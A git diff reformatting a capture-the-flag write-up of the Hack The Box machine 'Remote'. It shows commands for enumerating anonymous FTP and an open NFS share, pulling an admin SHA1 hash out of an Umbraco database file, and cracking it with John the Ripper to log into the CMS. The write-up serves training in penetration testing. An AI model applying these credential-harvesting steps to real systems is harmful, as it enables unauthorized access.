@@ -71,197 +71,130 @@ Host script results:
 
 On port 80, there is a website for ACME Widgets
 
-
-
 ![Home page of Remote on port 80](../.gitbook/assets/0%20%287%29.png)
 
 The website has references to Umbraco in the source code and on the site itself as an address. Searching for Umbraco on the Internet reveals that Umbraco is a content management system \(CMS\) and that it has a login page that is normally located at http;//remote.htb/umbraco. Navigating to that page gets a login prompt:
 
-
-
-![Graphical user interface, text, application, email
-
-Description automatically generated](../.gitbook/assets/1%20%285%29.png)
-
-
-
-
-
-
-
-
-
-
-
-Login page for http://remote.htb/umbraco
+![Login page for http://remote.htb/umbraco](../.gitbook/assets/1%20%285%29.png)
 
 This doesn't accept default credentials of admin/admin, admin/password, guest/guest etc. So turning to the FTP site, this accepts anonymous logins but there is nothing in the directory it has access to and we can't write either.
 
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Remote]
 └──╼ $ftp remote.htb
-
 Connected to remote.htb.
-
 220 Microsoft FTP Service
-
-Name \(remote.htb:rin\): anonymous
-
-331 Anonymous access allowed, send identity \(e-mail name\) as password.
-
+Name (remote.htb:rin): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
 Password:
-
 230 User logged in.
-
-Remote system type is Windows\_NT.
-
-ftp&gt; dir
-
+Remote system type is Windows_NT.
+ftp> dir
 200 PORT command successful.
-
 125 Data connection already open; Transfer starting.
-
 226 Transfer complete.
-
-ftp&gt; pwd
-
+ftp> pwd
 257 "/" is current directory.
-
-ftp&gt; put afile.txt
-
+ftp> put afile.txt
 local: afile.txt remote: afile.txt
-
 200 PORT command successful.
-
 550 Access is denied.
-
-ftp&gt;
+ftp>
+```
 
 Looking at the nmap output, we can see that the machine has NFS \(Network File System\) running \(the RPC services nfs, mountd on ports 111 and 2049\). NFS is the unix network file sharing service and we can use the utility showmount \(installed from the package nfs-common\) to list any available shares:
 
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Remote]
 └──╼ $showmount -e remote.htb
-
 Export list for remote.htb:
-
-/site\_backups \(everyone\)
+/site_backups (everyone)
+```
 
 We can then mount the directory /site\_backups with the mount command:
 
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
-└──╼ $mkdir site\_backups
-
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
-└──╼ $sudo mount -t nfs remote.htb:/site\_backups site\_backups/
+```bash
+┌─[rin@parrot]─[~/boxes/Remote]
+└──╼ $mkdir site_backups
+┌─[rin@parrot]─[~/boxes/Remote]
+└──╼ $sudo mount -t nfs remote.htb:/site_backups site_backups/
+```
 
 The contents of this directory are:
 
-┌─\[rin@parrot\]─\[~/boxes/Remote/site\_backups\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Remote/site_backups]
 └──╼ $ls -al
-
 total 119
-
 drwx------ 2 nobody 4294967294 4096 Feb 24 2020 .
-
 drwxr-xr-x 1 rin rin. 50 Jan 5 19:38 ..
-
-drwx------ 2 nobody 4294967294 64 Feb 21 2020 App\_Browsers
-
-drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App\_Data
-
-drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App\_Plugins
-
-drwx------ 2 nobody 4294967294 64 Feb 21 2020 aspnet\_client
-
+drwx------ 2 nobody 4294967294 64 Feb 21 2020 App_Browsers
+drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App_Data
+drwx------ 2 nobody 4294967294 4096 Feb 21 2020 App_Plugins
+drwx------ 2 nobody 4294967294 64 Feb 21 2020 aspnet_client
 drwx------ 2 nobody 4294967294 49152 Feb 21 2020 bin
-
 drwx------ 2 nobody 4294967294 8192 Feb 21 2020 Config
-
 drwx------ 2 nobody 4294967294 64 Feb 21 2020 css
-
 -rwx------ 1 nobody 4294967294 152 Nov 2 2018 default.aspx
-
 -rwx------ 1 nobody 4294967294 89 Nov 2 2018 Global.asax
-
 drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Media
-
 drwx------ 2 nobody 4294967294 64 Feb 21 2020 scripts
-
 drwx------ 2 nobody 4294967294 8192 Feb 21 2020 Umbraco
-
-drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Umbraco\_Client
-
+drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Umbraco_Client
 drwx------ 2 nobody 4294967294 4096 Feb 21 2020 Views
-
 -rwx------ 1 nobody 4294967294 28539 Feb 20 2020 Web.config
+```
 
 This looks like the umbraco website files. Searching on the Internet again for details of where Umbraco stores credentials, we note that these are stored normally in the database which by default is Microsoft SQL Server Compact Edition. This database is stored in a file with an extension of sdf. For Umbraco, this is normally stored in the file App\_Data/Umbraco.sdf. If you just looked at the Web.config file, this also references the data source information:
 
-&lt;connectionStrings&gt;
-
- &lt;remove name="umbracoDbDSN" /&gt;
-
- &lt;add name="umbracoDbDSN" connectionString="Data Source=\|DataDirectory\|\Umbraco.sdf;Flush Inter
-
-val=1;" providerName="System.Data.SqlServerCe.4.0" /&gt;
-
- &lt;!-- Important: If you're upgrading Umbraco, do not clear the connection string / provider nam
-
-e during your web.config merge. --&gt;
-
-&lt;/connectionStrings&gt;
+```bash
+<connectionStrings>
+ <remove name="umbracoDbDSN" />
+ <add name="umbracoDbDSN" 
+  connectionString="Data Source=|DataDirectory|\Umbraco.sdf;Flush Interval=1;" 
+   providerName="System.Data.SqlServerCe.4.0" />
+ <!-- Important: If you're upgrading Umbraco, do not clear the connection 
+ string / provider name during your web.config merge. -->
+</connectionStrings>
+```
 
 Theoretically, it should be possible to open the sdf file using a variety of different approaches on a Windows machine. When I tried this however, the database wouldn't open. An easier approach is to simply do strings on the database to extract all of the textual information and then grep for users. If we do this, we find a hash of a password for the user admin in the file:
 
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
-└──╼ $strings Umbraco.sdf \| grep admin
-
+```bash
+┌─[rin@parrot]─[~/boxes/Remote]
+└──╼ $strings Umbraco.sdf | grep admin
 Administratoradmindefaulten-US
-
 Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
-
-Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
-
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
-
-adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa
+    {"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa
+    {"hashAlgorithm":"SHA1"}admin@htb.localen-US
+    feb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa
+    {"hashAlgorithm":"SHA1"}admin@htb.localen-US
+    82756c26-4321-4d27-b429-1b5c7c4f882f
+```
 
 Cracking the hash \(b8be16afba8c314ad33d812f22a04991b90e2aaa\) with John The Ripper reveals the password baconandcheese
 
-┌─\[rin@parrot\]─\[~/boxes/Remote\]
-
+```bash
+┌─[rin@parrot]─[~/boxes/Remote]
 └──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-
 …
-
 Using default input encoding: UTF-8
-
-Loaded 1 password hash \(Raw-SHA1 \[SHA1 256/256 AVX2 8x\]\)
-
+Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
 Warning: no OpenMP support for this hash type, consider --fork=2
-
 Press 'q' or Ctrl-C to abort, almost any other key for status
+baconandcheese (?)
+```
 
-baconandcheese \(?\)
+Logging into the Umbraco site with user admin@local.htb and password baconandcheese gives us the admin site
 
-Logging into the Umbraco site with user admin@local.htb and password baconandcheese gives us the admin site shown in Figure 7-3
-
-
-
-![Graphical user interface, application, website
-
-Description automatically generated](../.gitbook/assets/2%20%288%29.png)
-
-Admin page for remote.htb umbraco site
-
-In the help page we note that the version of Umbraco is 7.12.4 as shown in Figure 7-4
+![Admin page for remote.htb umbraco site](../.gitbook/assets/2%20%288%29.png)
 
 
+
+In the help page we note that the version of Umbraco is 7.12.4
 
 ![Help page for remote.htb umbraco site](../.gitbook/assets/3%20%286%29.png)
 
